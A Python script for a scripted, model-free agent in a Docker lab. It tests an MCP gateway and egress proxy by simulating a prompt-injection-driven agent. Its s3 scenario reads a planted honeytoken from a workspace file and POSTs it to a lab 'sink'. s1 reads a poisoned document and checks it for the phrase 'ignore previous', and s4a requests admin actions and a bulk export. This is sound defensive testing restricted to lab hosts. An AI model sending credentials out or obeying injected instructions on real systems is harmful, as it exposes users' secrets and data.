"""The scripted agent used inside the Docker lab (scenarios S1 and S3, no model involved).

It runs in the lab's agent container and can only ever talk to the lab's own services. Every
connection goes through ``lab_only`` first, so an outside target is refused before any packet
leaves. The run token arrives in the environment, handed over by the lab runner.
"""

import asyncio
import json
import os
import re
import socket
import sys
from pathlib import Path
from typing import Any

import httpx
from mcp import Client
from mcp.client.streamable_http import streamable_http_client
from mcp.shared._httpx_utils import create_mcp_http_client

GATE_URL = "http://gate:8765/mcp"
PROXY_URL = "http://egress:3128"
SINK = ("sink", 8080)
SINK_BY_ADDRESS = ("172.31.0.20", 8080)  # the sink's address on the outside network
PARTNER = ("partner-api", 8080)
LAB_HOSTS = {"gate", "egress", "sink", "partner-api", "172.31.0.20"}
ATTRACTIVE = re.compile(r"export_all|dump_|secret|admin_api|payroll", re.IGNORECASE)


def lab_only(host: str) -> str:
    if host not in LAB_HOSTS:
        raise RuntimeError(f"{host!r} is not a lab service: the lab agent refuses it")
    return host


def gate_client() -> Client:
    http = create_mcp_http_client(headers={"Authorization": f"Bearer {os.environ['HC_RUN_TOKEN']}"})
    return Client(streamable_http_client(GATE_URL, http_client=http))


def direct_connect(target: tuple[str, int]) -> str:
    """Try to reach a lab server without the proxy. On the lab network this must fail."""
    try:
        socket.create_connection((lab_only(target[0]), target[1]), timeout=3).close()
    except OSError as exc:
        return f"blocked ({type(exc).__name__})"
    return "connected"


def via_proxy(method: str, target: tuple[str, int], path: str, body: bytes = b"") -> int:
    host, port = lab_only(target[0]), target[1]
    with httpx.Client(proxy=PROXY_URL, timeout=10, trust_env=False) as c:
        return c.request(method, f"http://{host}:{port}{path}", content=body).status_code


def planted_secret() -> str:
    """The honeytoken the lab runner planted in this agent's workspace."""
    line = Path("/workspace/.env.old").read_text().splitlines()[0]
    return line.split("=", 1)[1].strip().strip("'\"")


async def refused_now() -> bool:
    try:
        async with gate_client() as agent:
            await agent.list_tools()
    except Exception:
        return True
    return False


async def s3() -> dict[str, Any]:
    """Find the planted credential and try to send it out: directly, then through the proxy."""
    out: dict[str, Any] = {}
    async with gate_client() as agent:
        out["gate_tools"] = len((await agent.list_tools()).tools)
    out["benign_via_proxy"] = via_proxy("GET", PARTNER, "/status")
    out["direct_sink"] = direct_connect(SINK)
    out["direct_sink_address"] = direct_connect(SINK_BY_ADDRESS)
    out["exfil_via_proxy"] = via_proxy("POST", SINK, "/collect", planted_secret().encode())
    await asyncio.sleep(3)  # the gate reads the proxy's log twice a second
    out["gate_refuses_after"] = await refused_now()
    return out


async def s1() -> dict[str, Any]:
    """A poisoned document leads the agent to the most tempting export tool, over HTTP."""
    out: dict[str, Any] = {}
    async with gate_client() as agent:
        names = [t.name for t in (await agent.list_tools()).tools]
        doc = await agent.call_tool("docs__read_document", {"name": "q3-report.txt"})
        out["read_poisoned_document"] = "ignore previous" in str(doc.content[0].text).lower()  # type: ignore[union-attr]
        target = next(n for n in names if ATTRACTIVE.search(n))
        out["picked"] = target
        reply = await agent.call_tool(target, {})
        out["tarpit_reply_is_error"] = bool(reply.is_error)
    out["gate_refuses_after"] = await refused_now()
    return out


async def _call(agent: Client, tool: str, args: dict[str, Any]) -> dict[str, Any]:
    reply = await agent.call_tool(tool, args)
    text = str(reply.content[0].text) if reply.content else ""  # type: ignore[union-attr]
    return {"error": bool(reply.is_error), "text": text[:300]}


async def s4a() -> dict[str, Any]:
    """An injected instruction asks for admin actions and a bulk export."""
    out: dict[str, Any] = {}
    async with gate_client() as agent:
        out["rotate"] = await _call(agent, "crm__rotate_keys", {"scope": "all"})
        out["disable"] = await _call(agent, "crm__disable_user", {"user_id": 7})
        out["export"] = await _call(agent, "crm__export_report", {"report": "everyone"})
    return out


async def s4b() -> dict[str, Any]:
    """The same calls again, after a person has answered some of the requests."""
    out: dict[str, Any] = {}
    async with gate_client() as agent:
        out["disable"] = await _call(agent, "crm__disable_user", {"user_id": 7})
        out["rotate"] = await _call(agent, "crm__rotate_keys", {"scope": "all"})
    return out


def main() -> None:
    which = sys.argv[1] if len(sys.argv) > 1 else ""
    scenarios = {"s1": s1, "s3": s3, "s4a": s4a, "s4b": s4b}
    if which not in scenarios:
        raise SystemExit("usage: python -m lab.scenarios.lab_agent s1|s3|s4a|s4b")
    print(json.dumps(asyncio.run(scenarios[which]())))


if __name__ == "__main__":
    main()
